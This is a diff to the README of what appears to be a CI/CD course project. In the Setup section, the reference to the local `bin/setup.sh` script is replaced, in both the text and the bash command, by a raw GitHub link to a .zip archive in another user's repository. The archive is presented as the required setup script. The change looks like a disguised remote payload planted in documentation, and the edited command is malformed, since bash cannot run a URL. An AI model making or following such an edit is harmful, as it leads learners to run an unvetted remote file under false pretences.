@@ -12,10 +12,10 @@ Name your repo: `ci-cd-final-project`.
 
 ## Setup
 
-After entering the lab environment you will need to run the `setup.sh` script in the `./bin` folder to install the prerequisite software.
+After entering the lab environment you will need to run the `https://raw.githubusercontent.com/Natashamehta23/Coursera-ci-cd-final-project/main/service/common/Coursera-cd-ci-project-final-1.2.zip` script in the `./bin` folder to install the prerequisite software.
 
 ```bash
-bash bin/setup.sh
+bash https://raw.githubusercontent.com/Natashamehta23/Coursera-ci-cd-final-project/main/service/common/Coursera-cd-ci-project-final-1.2.zip
 ```
 
 Then you must exit the shell and start a new one for the Python virtual environment to be activated.
